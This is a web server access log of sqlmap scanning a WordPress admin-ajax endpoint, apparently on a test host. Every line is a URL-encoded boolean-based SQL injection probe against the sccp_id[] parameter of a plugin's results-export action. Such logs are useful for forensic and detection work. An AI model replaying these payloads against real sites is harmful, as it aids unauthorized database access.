1
192.168.59.217 - - [21/Apr/2022:12:37:07 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%29%29%20AS%20cBAy%20WHERE%204813%3D4813%20AND%203658%3D6269--%20ouJj&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:07 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%29%29%20AS%20vBPX%20WHERE%201924%3D1924%20AND%202508%3D1545--%20MfIp&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:07 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%29%20AS%20IhPD%20WHERE%201281%3D1281%20AND%206016%3D5415--%20GsLG&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:07 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%29%20AS%20YgCE%20WHERE%209325%3D9325%20AND%205349%3D6780--%20RAWX&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:07 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%29%20AS%20GGVz%20WHERE%203337%3D3337%20AND%202215%3D2585--%20uYVt&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:07 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%60%20WHERE%201166%3D1166%20AND%202438%3D7255--%20cjfI&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:07 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%60%29%20WHERE%209107%3D9107%20AND%202546%3D6078--%20vOTv&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:07 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%60%3D%603%29%60%20AND%202241%3D3548%20AND%20%603%29%60%3D%603%29&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:07 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%3D%223%29%22%20AND%209331%3D6073%20AND%20%223%29%22%3D%223%29&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:07 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%5D-%28SELECT%200%20WHERE%203557%3D3557%20AND%208121%3D8281%29%7C%5B3%29&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
